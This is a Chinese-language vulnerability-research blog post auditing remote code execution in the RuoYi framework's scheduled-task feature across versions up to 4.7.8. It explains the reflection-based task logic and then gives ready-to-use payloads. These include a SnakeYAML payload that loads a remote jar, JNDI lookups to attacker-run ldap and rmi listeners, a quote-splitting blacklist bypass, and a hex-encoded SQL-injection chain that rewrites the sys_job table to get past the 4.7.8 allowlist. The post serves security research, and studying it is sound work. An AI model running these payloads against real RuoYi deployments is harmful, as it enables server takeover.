前言
--

关于若依漏洞或者是审计的文章网上挺多的，本来就只是想写一下最新版4.7.8的RCE。因为之前没接触过若依就打算看看定时任务实现的原理以及历史的漏洞，但是在查阅资料的时候，发现了**一些**文章给的poc有问题，比如作者写的是&lt;4.7.2时，给的是`org.springframework.jndi.JndiLocatorDelegate.lookup('r'm'i://ip:端口/refObj')`，大概作者的目的是想说明可以通过若依对字符串的处理的一些问题(参数中的`'`会替换为空)绕过对`rmi`的过滤，但是却没有考虑到`org.springframework.jndi`在4.7.1版本中已经加入了黑名单。作者也只是给出了poc，并没有复现的过程！

计划任务实现原理
--------

从[官方文档](https://doc.ruoyi.vip/ruoyi/document/htsc.html#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1)可以看出可以通过两种方法调用目标类：

- Bean调用示例：ryTask.ryParams('ry')
- Class类调用示例：com.ruoyi.quartz.task.RyTask.ryParams('ry')

接下来咱调试一下，看看具体是如何实现的这个功能的

首先直接在测试类下个断点，看看调用

![image-20240305195847965](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cf50d3b9d468ec8186ecf8a22ba5d9ecaa92035a.png)

通过系统默认的任务1来执行这个测试类

![image-20240305200210899](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-9cef43be342236a86d51d10050a526b64c87a3c8.png)

![image-20240305200151822](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-24dd1f32e038ad07c3740dc88c46f65faa25b72b.png)  
在调用过程中，会发现在`com.ruoyi.quartz.util.JobInvokeUtil`类中存在两个名为`invokeMethod`的方法，并前后各调用了一次

![image-20240305202252424](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cd167c854b5c730081aa2e629f45c7a79c3dadc7.png)

在第一个`invokeMethod`方法中对调用目标字符串的类型进行判断，判断是Bean还是Class。然后调用第二个`invokeMethod`方法

- bean就通过getBean()直接获取bean的实例
- 类名就通过反射获取类的实例

```java
if (!isValidClassName(beanName)){  
    Object bean = SpringUtils.getBean(beanName);  
    invokeMethod(bean, methodName, methodParams);  
}  
else  
{  
    Object bean = Class.forName(beanName).newInstance();  
    invokeMethod(bean, methodName, methodParams);  
}
```

第二个`invokeMethod`这个方法通过反射来加载测试类

```java
if (StringUtils.isNotNull(methodParams) && methodParams.size() > 0){
    Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));
    method.invoke(bean, getMethodParamsValue(methodParams));
}
```

这大概就是定时任务加载类的逻辑

漏洞成因
----

接着我们新增一个定时任务，看看在创建的过程中对调用目标字符串做了哪些处理

抓包可以看到直接调用了`/monitor/job/add`这个接口

![image-20240305203342583](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-76db78a1473a0314143d0a813963f175660864bf.png)

可以看到就只是判断了一下，目标字符串是否包含`rmi://`，这就导致导致攻击者可以调用任意类、方法及参数触发反射执行命令。

![image-20240305203753016](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-85aa69d0421513243f55c2fba3357cfd01beb3b8.png)

![image-20240305203844623](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-fc599b4dbbd09dad269e2d6a95c2212f0cf3dc0f.png)

由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到getshell的目的，该类只需要满足如下几点要求即可：

- 具有public类型的无参构造方法
- 自身具有public类型且可以执行命令的方法

4.6.2
-----

因为目前对**调用目标字符串**限制不多，so直接拿网上公开的poc打吧！

- 使用Yaml.load()来打SnakeYAML反序列化
- JNDI注入

### SnakeYAML反序列化

探测SnakeYAMLpoc：

```php
String poc = "{!!java.net.URL [\"http://5dsff0.dnslog.cn/\"]: 1}";
```

利用SPI机制-基于ScriptEngineManager利用链来执行命令，直接使用这个师傅写好的脚本：<https://github.com/artsploit/yaml-payload>

1）把这块修改成要执行的命令

![image-20240305230802764](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-aaa947e4c6ed99a6133eb87abcf205cf05f2fd75.png)

2）把项目生成jar包

```php
javac src/artsploit/AwesomeScriptEngineFactory.java　　　　//编译java文件
jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　//打包成jar包
```

3）在yaml-payload.jar根目录下起一个web服务

```php
python -m http.server 9999
```

4）在计划任务添加payload，执行

```php
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]]]]')
```

![image-20240305232500918](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-101523cad0c31c5786433aa43c0359721ef8f30d.png)

### JNDI注入

使用yakit起一个返连服务

![image-20240305234800803](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-802a0a0d3800ab3af3bd987bae213ebd437c17a9.png)

poc：

```php
javax.naming.InitialContext.lookup('ldap://127.0.0.1:8085/calc')
```

nc监听端口

![image-20240305234715061](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a8120435c3ad4e7e8cf3b8d7d91d83b0dfe860bc.png)

![image-20240305234736910](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-be534fe80b3221bf79c520e2dd616c4af9a56ab6.png)

&lt; 4.6.2
----------

### rmi

上边的分析是拿4.6.2版本分析的，在创建定时任务时会判断目标字符串中有没有rmi关键字。后边有拐回来看一下，发现在4.6.2版本以下，在创建定时任务时是没有任何过滤的。

![image-20240306182957873](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5e1aa793587221c70971115df956c1da3ceb538b.png)

所以在补充一个rmi的poc：

```php
org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')
```

![image-20240306183633480](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-8b00327280fa2031d36f20b578f1447ccad18e00.png)

![image-20240306183659672](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-87939593ec5852516cf7b29356a42b528ccd5311.png)

&lt;4.7.0
---------

`4.6.2~4.7.1`新增黑名单限制调用字符串

- 定时任务屏蔽ldap远程调用
- 定时任务屏蔽http(s)远程调用
- 定时任务屏蔽rmi远程调用

![image-20240306185654502](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-751b82a6561244d3b75e4cc6c9f82f71eed005f3.png)

![image-20240306185736206](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cee68ee4c49d21d2f9274c60f52c5943e9506002.png)

来个小插曲，之前又看到一个文章，阅读量还不少类，师傅给出的poc是利用范围是**&lt;4.7.2**

![image-20240306191000306](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5eab99526e1cec04c0d685a2c4f849001b74445d.png)

后边发现不止这一篇，其他就不在举例了。

![image-20240306193040061](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-61674861666d37add1a44ac63bd037b6022f6d5e.png)

但是我去翻了diff，发现在4.7.1中的黑名单已经过滤了这些poc。

![image-20240306191126087](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-720b5b08913d2cccfb6203898893125677b18b51.png)

### 单引号绕过

在4.7.0的版本以下，仅仅只是屏蔽了ldap、http(s)、ldap。这里可以结合若依对将参数中的所有单引号替换为空来绕过

poc、例如：

```php
org.springframework.jndi.JndiLocatorDelegate.lookup('r'm'i://127.0.0.1:1099/refObj')
```

分析：

创建任务时`r'm'i`可以绕过对`rmi`的过滤

![image-20240306233303535](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a510511e8ce0a1aec0fa8e43eb93836c178aa745.png)

之前分析的定时任务运行的原理，会在`com.ruoyi.quartz.util.JobInvokeUtil`类中第一个`invokeMethod`方法调用`getMethodParams`方法来获取参数

![image-20240306233449771](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3b044996b81e181d404489e5a386019641ddf611.png)

跟进之后发现会把参数中的`'`替换为空

![image-20240306233620830](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-15b7211a8f10943635d02864408d2b98b494ffeb.png)

打个断点调试一下

![image-20240306233813294](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5c6c3253c6b0eb946d856d72c1ada5da0fcc7192.png)

&lt;4.7.2
---------

在这个版本下可以看到有可以看到有ldaps、配置文件rce等方法bypass，网上挺多文章的就不分析了

### ldaps

### 配置文件rce

4.7.3
-----

在4.7.3的版本下，又增加了白名单，只能调用com.ruoyi包下的类！并且把之前所有的路堵死了

![image-20240306213248788](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-31e84d0e2410125611ea3ff50912774bbc2d5fb7.png)

![image-20240306213334189](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3a98a9615009057816fceeedae6bab1e8c1475f9.png)

4.7.8（最新版）
----------

依旧是没办法绕过黑白名单的限制。之前我们大概分析了一下定时任务的创建。对**调用目标字符串**过滤是在定时任务创建时进行的

审计之后可以看到，对目标字符串的过滤只发生在增加、修改计划任务时

![image-20240306214236876](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1b3a96cec567323c973654b5c2105c3f0d6b78a8.png)

创建后的定时任务信息存储在**sys\_job**表中

![image-20240306214001345](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-420861f7e4970dce92490b787be792dd09c39a3b.png)

结合4.7.5 版本下的sql注入漏洞，直接修改表中的数据  
参考：[https://gitee.com/y\_project/RuoYi/issues/I65V2B](https://gitee.com/y_project/RuoYi/issues/I65V2B)

在`com.ruoyi.generator.controller.GenController#create`

![image-20240306221326697](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3ad6683a45b3fed6b9c63984918121a1a1fa66ec.png)

这块直接调用了`genTableService.createTable()`,咱直接跟进去看看

![image-20240306221433954](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-14a114543bd4fb72440c37a4e40b2a76e30d686f.png)

Mapper语句：

![image-20240306221510785](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-279867d0cbdd8be4f2ecaefc7fa85061b1e995c2.png)

接下来创建一个定时任务调用这个类，直接从sys\_job表中把某一个定时任务调用目标字符串(invoke\_target字段)改了

先谈个dnslog试试

```php
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'javax.naming.InitialContext.lookup('ldap://xcrlginufj.dgrh3.cn')' WHERE job_id = 1;')
```

但会触发黑名单

![image-20240306222714229](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3572483765e5676a68ded83d84afa0b2673e496a.png)

由于是执行sql语句，直接将value转为16进制即可

![image-20240306222803488](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-4e3b26535f30ef0508858f3d4defcbd08a7966eb.png)

```php
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7863726c67696e75666a2e64677268332e636e2729 WHERE job_id = 1;')
```

可以成功创建  
![image-20240306222855973](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-aa602bfe6b5639d2e2985db70bc2601c74efe230.png)

运行后任务1的**调用目标字符串**也被成功修改

![image-20240306223045794](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-17c83b11a879388d49f1df65207326c010b5135e.png)

紧接着运行任务1

![image-20240306223112608](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3785c643538709c65f0fbc9754dc52fe1ee40692.png)

接下来弹个计算机

yakit开个反连，配置一下

![image-20240306223503680](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3151287bc512b240af53000b5d75166869e306b6.png)

执行上边的步骤修改任务1，在运行任务1

![image-20240306223547419](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-456a3bcf525c08f271624c3726716d695396ba58.png)

![image-20240306223447821](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-04329d5c8b8b15b42c709649335789a0f625a56c.png)

总结
--

碰上前言中说到的事确实感到挺无奈却又无可奈何。也有可能是我能力不够分析有误，如果有问题希望各位师傅及时指正！

参考
--

<https://xz.aliyun.com/t/10687>

<https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90>

[https://www.cnblogs.com/pursue-security/p/17658404.html#\_label1\_3](https://www.cnblogs.com/pursue-security/p/17658404.html#_label1_3)

<https://xz.aliyun.com/t/10957>

<https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC>